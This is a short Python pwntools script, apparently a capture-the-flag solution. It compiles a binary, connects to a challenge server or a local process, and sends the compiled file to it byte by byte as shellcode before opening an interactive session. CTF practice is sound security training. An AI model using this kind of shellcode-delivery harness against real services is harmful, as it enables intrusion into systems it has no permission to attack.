from pwn import *
from subprocess import check_output

check_output("make")

if args.REMOTE:
    p = remote("blackhat.flagyard.com", "31460")
else:
    p = process("./run.sh")
p.recvuntil(b"Shellcode: ")

code = open("main", "rb").read()
print(f"{len(code) = :#x}")
if args.REMOTE:
    code = code.ljust(0x1000, b"\x00")
else:
    code = code.ljust(0x10000, b"\x00")

for byte in code:
    p.sendline(f"{byte:02x}".encode())

p.interactive()